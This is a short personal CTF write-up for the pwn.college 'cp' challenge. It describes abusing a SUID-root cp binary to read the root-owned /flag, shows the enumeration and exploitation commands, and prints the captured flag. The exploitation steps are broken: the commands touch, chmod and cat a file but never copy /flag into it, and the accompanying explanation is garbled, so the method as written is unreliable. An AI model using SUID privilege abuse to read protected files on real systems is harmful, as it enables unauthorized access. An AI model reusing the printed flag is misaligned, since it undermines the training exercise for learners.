---
layout: page
title: "Challenge Name: cp"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Beginner  
**Date**: 2025-07-16  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/cp`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/cp
```

Output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/cp
```

- The `s` in `-rws` indicates it's a SUID binary.
- `cp` runs with **root privileges**.

## 🚀 Exploitation

The `cp` command in Linux is used to copy files and directories.
But, simply copying /flag to other wont make change , even the copied file will need root permission to read the flag.

We can create file along chmod o+r and then copy to it , it will work with out permission

```bash
touch myflag
chmod o+r myflag
cat myflag
```

Output:
```
pwn.college{MxkdnWZIc22k3L_zDsLN4FQA-DV.dFDOxwSM0IzMyEzW}
```
